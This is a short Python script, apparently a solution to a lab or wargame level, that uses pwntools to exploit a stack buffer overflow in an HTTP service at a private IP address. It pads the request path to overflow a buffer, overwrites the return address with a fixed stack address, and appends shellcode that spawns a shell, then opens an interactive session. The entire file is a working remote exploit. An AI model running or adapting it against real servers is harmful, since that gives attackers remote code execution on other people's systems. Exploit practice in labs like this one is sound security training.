#!/usr/bin/env python3
 
import pwn
 
io = pwn.remote("192.168.132.133", 20000)
 
# buffer is at 0xbffff8f8
target = pwn.p32(0xbffff8f8 + 157)
 
shellcode = pwn.asm(pwn.shellcraft.sh())
 
payload  = b"GET /" + b"A"*127 # fill the 'resolved' buffer
payload += b"B"*12
payload += target
payload += b" HTTP/1.1"
payload += shellcode
 
print(io.recv().decode())
io.sendline(payload)
io.interactive()